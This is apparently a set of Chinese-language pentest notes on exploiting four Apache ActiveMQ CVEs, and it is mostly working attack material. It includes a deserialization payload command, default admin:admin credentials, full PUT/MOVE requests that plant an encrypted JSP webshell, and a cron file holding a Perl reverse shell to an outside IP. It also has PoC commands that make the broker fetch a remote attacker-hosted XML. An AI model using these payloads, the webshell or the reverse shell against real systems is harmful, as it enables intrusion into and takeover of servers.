# activemq

## CVE-2015-5252

ActiveMQ反序列化漏洞

```
Apache ActiveMQ 5.13.0之前5.x版本
```

利用可执行命令的序列化对象作为一个消息，发送给对方的61616端口，然后通过8161的web端管理页面读取消息，从而触发命令

web端后台地址

/admin

默认口令

```
admin:admin
```

需要得到管理员账号密码然后手动触发消息实现命令执行，或是诱导管理员访问链接触发

payload：

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 192.168.1.15 61616
```

然后访问

```
/admin/browse.jsp?JMSDestination=event
```

手动触发





## CVE-2016-3088

ActiveMQ任意文件写入漏洞

```
Apache ActiveMQ 5.x - 5.14.0
```

8161 web端分为三个应用，admin，api和fileserver，其中admin和api都需要登录，fileserver无需登录，但是fileserver中无法解析jsp，不过其支持MOVE请求，因此我们可以写入jsp文件，然后利用MOVE请求将其移动到任意位置

同时我们也可以尝试写入cron或ssh key等文件

通过访问

```
/admin/test/systemProperties.jsp
```

可以得到ActiveMQ的绝对路径，但是这也需要弱口令登录后台

然后访问fileserver，GET请求改为PUT，上传jsp木马

```
PUT /fileserver/ra1n3.jsp HTTP/1.1
Host: 192.168.1.15:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Authorization: Basic YWRtaW46YWRtaW4=
Accept-Encoding: gzip, deflate
If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1

<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>
```



然后利用MOVE将其移动到合适的位置，如api

```
Destination:file:///opt/apache-activemq-5.11.1/webapps/api/ra1n3.jsp
```

其中/opt/apache-activemq-5.11.1为之前得到的active的绝对路径

```
MOVE /fileserver/ra1n3.jsp HTTP/1.1
Host: 192.168.1.15:8161
Destination:file:///opt/activemq/webapps/api/ra1n3.jsp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Authorization: Basic YWRtaW46YWRtaW4=
Accept-Encoding: gzip, deflate
If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1
```

然后可以通过访问/api/ra1n3.jsp验证

页面为空则说明成功上传webshell，但是要注意的是，api和admin访问时，需要身份验证，因此后续利用webshell管理工具连接时，需要加入身份验证的HEAD

```
Authorization: Basic YWRtaW46YWRtaW4=
```

这里是admin：admin



定时任务反弹shell

思路：将cron文件从fileserver移动到/etc/cron.d

然后开启监听等待回连

定时这需要运行activemq的用户具有root权限，同时服务器开启了cron服务，运行activemq的用户具有使用crontab的权限

```
PUT /fileserver/cron.txt HTTP/1.1
Host: 192.168.1.15:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 246

*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="192.168.1.21";$p=283;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
##

```

这里是perl反弹shell



```
MOVE /fileserver/cron.txt HTTP/1.1
Destination:file:///etc/cron.d/root
Host: 192.168.1.15:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0
```

将其移动到/etc/cron.d，同时重命名为root





## CVE-2022-41678

ActiveMQ Jolokia 代码执行漏洞

```
Apache ActiveMQ < 5.16.6

5.17.0 < Apache ActiveMQ < 5.17.4
```

Activemq后台存在jolokia代码执行漏洞，经过身份验证的攻击者可通过/api/jolokia接口操作MBean，其中FlightRecorder可用于被写入jsp webshell，从而导致远程代码执行

```
漏洞思路是通过setConfiguration修改配置文件，在配置文件中的键名插入WebShell，由于导出的数据会包含键名，所以当我们在键名中插入WebShell时，导出的数据也会包含WebShell

调用copyTo方法，将记录的数据保存到指定文件，这里我们可与指定为一个web应用目录下的一个jsp文件

这样即实现了写入一个包含恶意命令执行代码的webshell文件

代码位置在jdk.management,jfr.FlightRecorderMXBeanlmpl#setConfiguration

- 登录ActiveMQ后台：首先要凭借有效的登录验证凭据登录到ActiveMQ的后台
- 构造恶意HTTP请求：攻击者构造一个恶意代码的HTTP请求，该请求将利用FlightRecorderMBean中的方法来写入恶意文件
  - 具体来说就是，攻击者通过setConfiguration方法修改配置，将一些键名改为JSP代码，这样记录的数据中就会包含攻击者注入的JSP代码
- 发送恶意HTTP请求：将构造好的恶意HTTP请求发送到ActiveMQ服务器的/api/jolokia/接口
- 写入恶意文件：当ActiveMQ服务器接收到这个恶意HTTP请求并处理时，会触发漏洞，导致恶意代码被写入到ActiveMQ的web目录中
- 执行远程代码：通过访问包含恶意代码的JSP文件来执行远程代码，从而完全控制目标系统
```

同时可利用FlightRecorder这个Mbean

```
python poc.py -u admin -p admin --exploit jfr http://192.168.1.15:8161
```

或是利用Log4j2提供的MBean，但是这个方法受到ActiveMQ版本限制，因为Log4j2是在5.17.0中才引入的

```
python3 poc.py --username admin --password admin http://192.168.1.15:8161
```



## CVE-2023-46604

Apache ActiveMQ RCE

```
Apache ActiveMQ <= 5.18.2
```

在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。

在本地poc.xml路径下开启http服务

利用poc.py触发poc.xml

payload：

```
python -m http.server 9999
```

```
python3 poc.py 192.168.1.15 61616 http://192.168.1.1:9999/poc.xml
```

